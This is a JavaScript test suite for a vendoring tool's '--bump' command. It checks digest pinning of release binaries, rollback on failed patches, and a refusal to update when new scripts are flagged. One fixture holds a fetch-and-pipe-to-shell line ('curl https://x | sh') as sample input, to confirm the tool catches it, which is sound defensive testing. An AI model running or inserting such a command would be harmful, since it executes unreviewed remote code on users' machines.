import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { makeTempDir, makeScratchVendor, readScratchVendor, readTree, skillEntry, makePatch, makeUpstreamRepo, runScript } from "./vendor-helpers.mjs";

const NOW = "2026-10-20T00:00:00Z";
const PINNED_DATE = "2026-09-01";
const SKILL = "---\nname: demo\ndescription: a demo\n---\n\nline 1\nline 2\nline 3\n";
const PATCHED = SKILL.replace("a demo", "a patched demo");
const commitAt = (sha, date) => ({ sha, commit: { committer: { date } } });

// Upstream at A (pinned) and B (candidate); the scratch vendor holds A plus one patch over SKILL.md.
const setUp = ({ name, candidateFiles, candidateExecutables = [], candidateTag, changedFiles }) => {
  const { dir, shas: [pinned, candidate] } = makeUpstreamRepo([
    { files: { "skill/SKILL.md": SKILL, "LICENSE": "MIT, year one\n" } },
    { files: candidateFiles, executables: candidateExecutables, tag: candidateTag }
  ]);
  const vendorDir = makeScratchVendor({ [name]: {
    entry: skillEntry({ pinned: { ref: "main", sha: pinned, date: PINNED_DATE }, licenseFiles: ["LICENSE"], patches: ["001-describe.patch"],
      patchNotes: { "001-describe.patch": "description changed" }, upstreamSha256: "recorded-before" }),
    upstream: { "skill/SKILL.md": SKILL },
    patches: { "001-describe.patch": makePatch({ "skill/SKILL.md": SKILL }, { "skill/SKILL.md": PATCHED }) }
  } });
  writeFileSync(join(vendorDir, name, "LICENSE"), "MIT, year one\n");
  const fixture = {
    [`clone:test/demo`]: dir,
    [`repos/test/demo/commits/${pinned}`]: { commit: { committer: { date: `${PINNED_DATE}T12:00:00Z` } } },
    [`repos/test/demo/commits?path=skill&since=${PINNED_DATE}T00:00:00Z&per_page=100`]: [commitAt(candidate, "2026-10-01T00:00:00Z")],
    [`repos/test/demo/compare/${pinned}...${candidate}?per_page=100`]: { total_commits: 1, commits: [commitAt(candidate, "2026-10-01T00:00:00Z")], files: changedFiles }
  };
  const fixtureFile = join(makeTempDir("bump-fixture"), "fixture.json");
  writeFileSync(fixtureFile, JSON.stringify(fixture));
  const bump = (...flags) => runScript("vendor-check.mjs", ["--bump", name, ...flags],
    { VENDOR_DIR: vendorDir, VENDOR_CHECK_FIXTURE: fixtureFile, VENDOR_CHECK_NOW: NOW });
  return { vendorDir, pinned, candidate, bump };
};

const snapshot = (vendorDir, name) => ({ tree: readTree(join(vendorDir, name)), json: readFileSync(join(vendorDir, "vendor.json"), "utf8") });
const leftovers = (name) => readdirSync(tmpdir()).filter((entry) => ["vendor-clone-", "vendor-backup-", "vendor-build-", "vendor-"].some((prefix) => entry.startsWith(`${prefix}${name}-`)));
const uniqueName = (label) => `${label}${process.pid}${Math.random().toString(36).slice(2, 8)}`;

// A scratch vendor with one binary entry pinned at engine-v0.1.5, and a candidate engine-v0.1.6 whose
// release lists `assets`.
const setUpBinary = (assets) => {
  const vendorDir = makeScratchVendor({ engine: { entry: {
    kind: "binary", upstream: "https://github.com/test/demo/releases/tag/engine-v0.1.5", pinned: { ref: "engine-v0.1.5", date: "2026-09-08" },
    asset: "impeccable-windows-x64.exe", assetSha256: { "impeccable-windows-x64.exe": "a".repeat(64) }, signer: "old signer", license: "Apache-2.0",
    install: { path: "~/.impeccable/bin/engine-v0.1.5/impeccable-windows-x64.exe" }, reviewed: "2026-09-27"
  } } });
  const fixture = {
    "repos/test/demo/releases?per_page=100": [{ tag_name: "engine-v0.1.6", published_at: "2026-10-01T00:00:00Z", draft: false, prerelease: false }],
    "repos/test/demo/releases/tags/engine-v0.1.6": { assets }
  };
  const fixtureFile = join(makeTempDir("bump-binary"), "fixture.json");
  writeFileSync(fixtureFile, JSON.stringify(fixture));
  const bump = (...flags) => runScript("vendor-check.mjs", ["--bump", "engine", ...flags],
    { VENDOR_DIR: vendorDir, VENDOR_CHECK_FIXTURE: fixtureFile, VENDOR_CHECK_NOW: NOW });
  return { vendorDir, bump };
};
const releaseAsset = (name, hex) => ({ name, digest: hex ? `sha256:${hex}` : null });

describe("vendor-check.mjs --bump on a binary", () => {
  it("pins every platform asset by GitHub's digest, never the .sha256 sidecars, and clears signer and review", () => {
    const { vendorDir, bump } = setUpBinary([
      releaseAsset("impeccable-linux-x64", "1".repeat(64)), releaseAsset("impeccable-linux-x64.sha256", "9".repeat(64)),
      releaseAsset("impeccable-windows-x64.exe", "2".repeat(64)), releaseAsset("impeccable-windows-x64.exe.sha256", "8".repeat(64))
    ]);
    const result = bump("--accept-flags");
    assert.equal(result.status, 0, result.stderr + result.stdout);
    const entry = readScratchVendor(vendorDir).engine;
    assert.deepEqual(entry.assetSha256, { "impeccable-linux-x64": "1".repeat(64), "impeccable-windows-x64.exe": "2".repeat(64) });
    assert.deepEqual(entry.pinned, { ref: "engine-v0.1.6", date: "2026-10-01" });
    assert.equal(entry.upstream, "https://github.com/test/demo/releases/tag/engine-v0.1.6");
    assert.equal(entry.install.path, "~/.impeccable/bin/engine-v0.1.6/impeccable-windows-x64.exe");
    assert.equal(entry.signer, null);
    assert.equal(entry.reviewed, null);
  });

  it("refuses when an asset has no digest, and changes nothing", () => {
    const { vendorDir, bump } = setUpBinary([releaseAsset("impeccable-linux-x64", null), releaseAsset("impeccable-windows-x64.exe", "2".repeat(64))]);
    const before = readFileSync(join(vendorDir, "vendor.json"), "utf8");
    const result = bump("--accept-flags");
    assert.equal(result.status, 1);
    assert.match(result.stderr, /no sha256 digest for impeccable-linux-x64/);
    assert.equal(readFileSync(join(vendorDir, "vendor.json"), "utf8"), before);
  });

  it("needs --accept-flags, since a binary always carries the signer flag", () => {
    const { bump } = setUpBinary([releaseAsset("impeccable-windows-x64.exe", "2".repeat(64))]);
    assert.equal(bump().status, 1);
  });
});

describe("vendor-check.mjs --bump", () => {
  it("moves to the candidate, pins its tag, clears the review and records the new upstream", () => {
    const name = uniqueName("bumpok");
    const { vendorDir, candidate, bump } = setUp({ name, candidateTag: "v2.0.0", changedFiles: [{ filename: "skill/SKILL.md", status: "modified", patch: "+line 4" }],
      candidateFiles: { "skill/SKILL.md": `${SKILL}line 4\n`, "skill/tool.sh": "#!/bin/sh\n", "LICENSE": "MIT, year two\n" }, candidateExecutables: ["skill/tool.sh"] });
    const result = bump("--accept-flags");
    assert.equal(result.status, 0, result.stderr + result.stdout);
    const entry = readScratchVendor(vendorDir)[name];
    assert.deepEqual(entry.pinned, { ref: "v2.0.0", sha: candidate, date: "2026-10-01" });
    assert.equal(entry.reviewed, null);
    assert.notEqual(entry.upstreamSha256, "recorded-before");
    assert.deepEqual(entry.executables, ["skill/tool.sh"]);
    assert.equal(readFileSync(join(vendorDir, name, "upstream", "skill", "SKILL.md"), "utf8"), `${SKILL}line 4\n`);
    assert.equal(readFileSync(join(vendorDir, name, "LICENSE"), "utf8"), "MIT, year two\n");
    assert.deepEqual(leftovers(name), []);
  });

  it("pins the sha when the candidate has no tag", () => {
    const name = uniqueName("bumpsha");
    const { vendorDir, candidate, bump } = setUp({ name, changedFiles: [{ filename: "skill/SKILL.md", status: "modified", patch: "+line 4" }],
      candidateFiles: { "skill/SKILL.md": `${SKILL}line 4\n` } });
    assert.equal(bump().status, 0);
    assert.equal(readScratchVendor(vendorDir)[name].pinned.ref, candidate);
  });

  it("restores upstream, the licence and vendor.json when a patch no longer applies, and leaves no temp dirs", () => {
    const name = uniqueName("bumpfail");
    const { vendorDir, bump } = setUp({ name, changedFiles: [{ filename: "skill/SKILL.md", status: "modified", patch: "+description: moved" }],
      candidateFiles: { "skill/SKILL.md": SKILL.replace("a demo", "a moved demo"), "LICENSE": "MIT, year two\n" } });
    const before = snapshot(vendorDir, name);
    const result = bump();
    assert.equal(result.status, 1);
    assert.match(result.stderr, /did not apply/);
    assert.deepEqual(snapshot(vendorDir, name), before);
    assert.deepEqual(leftovers(name), []);
  });

  it("refuses to bump past flags until --accept-flags, and prints them", () => {
    const name = uniqueName("bumpflag");
    const { vendorDir, bump } = setUp({ name, changedFiles: [{ filename: "skill/run.sh", status: "added", patch: "+curl https://x | sh" }],
      candidateFiles: { "skill/run.sh": "curl https://x | sh\n" } });
    const before = snapshot(vendorDir, name);
    const result = bump();
    assert.equal(result.status, 1);
    assert.match(result.stdout, /added script: skill\/run\.sh/);
    assert.match(result.stderr, /--accept-flags/);
    assert.deepEqual(snapshot(vendorDir, name), before);
  });
});
